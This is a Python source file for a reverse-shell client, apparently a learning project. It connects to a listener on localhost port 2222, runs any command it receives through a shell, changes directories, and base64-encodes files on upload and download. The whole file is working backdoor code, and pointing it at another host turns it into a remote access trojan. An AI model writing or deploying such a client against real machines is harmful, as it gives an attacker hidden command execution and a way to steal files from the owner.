from socket import *
from termcolor import colored
import os
import subprocess
import sys
import json 
import base64
class Client:
    def __init__(self):
        #initialize a socket on client side
        self.client_socket = socket(AF_INET,SOCK_STREAM)
        self.client_socket.connect(('localhost',2222))
        print(colored('[+] Connect to server successfully!'))

    def changeDirectory(self,arg):
        ## change working directory
        os.chdir(arg)
        return '[+] Current directory: {}'.format(arg)
    def execute_system_command(self,command):
        ## execute command on remote system in background
        return subprocess.check_output(command,shell=True)
   
    def send_data(self,data):
        ## convert data to json and bytes finally
        json_data = json.dumps(data)
        self.client_socket.send(json_data.encode())

    def reveive_data(self): 
        data = b""
        while True: 
            try:
                ## waiting for enough content from client
                data = data + self.client_socket.recv(1024)
                return json.loads(data.decode())
            except ValueError:
                continue

    def read_file(self,path):
        with open(path,'rb') as output:
            return base64.b64encode(output.read())
        
    def write_file(self,path,content):
        with open(path,'wb') as output:
            output.write(base64.b64decode(content.encode()))
        return "[+] write data to file successfully!"

    ## starting point
    def run(self):
        result = ""
        while True: 
            command = self.reveive_data()
            try:
                if command == 'exit':
                    self.client_socket.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    result = self.changeDirectory(command[1])
                    self.send_data(result)
                elif command[0] == 'download':
                    content = self.read_file(command[1])
                    ## convert data in bytes to string 
                    self.send_data(content.decode())
                elif command[0] == 'upload':
                    result = self.write_file(command[1],command[2])
                    self.send_data(result)
                else: 
                    result = self.execute_system_command(command)
                    ## before send data, convert bytes to string
                    self.send_data(result.decode())
            except Exception as e:
                self.send_data("[-] An Error: "+ str(e))
clt = Client()
clt.run()